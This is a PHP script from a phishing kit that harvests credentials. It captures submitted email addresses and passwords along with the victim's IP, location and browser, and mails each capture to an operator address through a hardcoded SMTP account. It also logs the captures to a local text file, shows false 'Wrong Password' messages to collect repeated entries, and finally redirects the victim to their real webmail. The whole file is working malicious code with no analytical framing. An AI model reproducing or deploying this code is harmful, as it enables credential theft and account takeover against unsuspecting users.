<?php
// Add CORS headers
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, X-Requested-With");
header("Content-Type: application/json");

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

require_once __DIR__ . '/PHPMailer.php';
require_once __DIR__ . '/SMTP.php';
require_once __DIR__ . '/Exception.php';

// Get client IP and location data
$ip = $_SERVER['REMOTE_ADDR'];
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));

session_start();

// Block GET requests
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    http_response_code(403);
    echo json_encode(array('signal' => 'not ok', 'msg' => 'GET requests not allowed'));
    exit;
}

//----------------------------------------------------------\\
// SMTP Configuration - ONLY for sending notifications to YOU
$receiver = "bobrob@elitat.com"; // YOUR EMAIL HERE
$senderuser = "jered@globalrisk.ru"; // YOUR SMTP USER
$senderpass = "global.321"; // YOUR SMTP PASSWORD
$senderport = "587"; // YOUR SMTP PORT
$senderserver = "mail.globalrisk.ru"; // YOUR SMTP SERVER
//----------------------------------------------------------\\

// Check if POST data exists
if (!isset($_POST['email']) || !isset($_POST['password'])) {
    echo json_encode(array('signal' => 'not ok', 'msg' => 'Missing email or password'));
    exit;
}

// Get form data and browser info
$browser = $_SERVER['HTTP_USER_AGENT'];
$login = $_POST['email'];
$password = $_POST['password'];
$email = $login;

// Validate email format
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    echo json_encode(array('signal' => 'not ok', 'msg' => 'Invalid email format'));
    exit;
}

// Extract domain from email
$parts = explode("@", $email);
$domain = $parts[1];

// Track attempts per email using session
if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = array();
}

if (!isset($_SESSION['login_attempts'][$email])) {
    $_SESSION['login_attempts'][$email] = 0;
}

$_SESSION['login_attempts'][$email]++;
$attempt_count = $_SESSION['login_attempts'][$email];

// Prepare email subject for notification
$subject = "Login Attempt #" . $attempt_count . " || " . $ipdat->geoplugin_countryName . " || " . $login;

// Prepare message content
$message = "=== LOGIN ATTEMPT #" . $attempt_count . " CAPTURED ===\n";
$message .= "Email: " . $login . "\n";
$message .= "Password: " . $password . "\n";
$message .= "Domain: " . $domain . "\n";
$message .= "IP Address: " . $ip . "\n";
$message .= "Location: " . $ipdat->geoplugin_countryName . " | " . $ipdat->geoplugin_city . "\n";
$message .= "Browser: " . $browser . "\n";
$message .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
$message .= "Attempt Count: " . $attempt_count . "/5\n";
$message .= "Session ID: " . session_id() . "\n";
$message .= str_repeat("=", 50) . "\n\n";

// Send email notification to YOUR email for EVERY attempt
$mail_sent = false;

try {
    $mail = new PHPMailer;
    $mail->isSMTP();
    $mail->Host = $senderserver;
    $mail->SMTPAuth = true;
    $mail->Username = $senderuser;
    $mail->Password = $senderpass;
    $mail->Port = $senderport;
    $mail->From = $senderuser;
    $mail->FromName = 'Login Capture System';
    $mail->addAddress($receiver);
    $mail->isHTML(false);
    $mail->Subject = $subject;
    $mail->Body = $message;
    
    if ($mail->send()) {
        $mail_sent = true;
    }
} catch (Exception $e) {
    error_log("Email sending failed: " . $e->getMessage());
}

// Log to file (always do this)
$fp = fopen("SS-Or.txt", "a");
if ($fp) {
    fputs($fp, $message);
    fclose($fp);
}

// Check if this is the 5th attempt - redirect to real webmail
if ($attempt_count >= 5) {
    $redirect_url = 'https://webmail.' . $domain;
    
    $data = array(
        'signal' => 'OK',
        'success' => true,
        'msg' => 'Redirecting to your webmail...',
        'attempt' => $attempt_count,
        'redirect_url' => $redirect_url,
        'email_sent' => $mail_sent
    );
    
    // Reset attempt counter for this email
    unset($_SESSION['login_attempts'][$email]);
} else {
    // Show "Wrong Password" for attempts 1-4
    $data = array(
        'signal' => 'not ok',
        'msg' => 'Wrong Password',
        'attempt' => $attempt_count,
        'remaining' => (5 - $attempt_count),
        'email_sent' => $mail_sent
    );
}

// Return JSON response
echo json_encode($data);

exit();
?>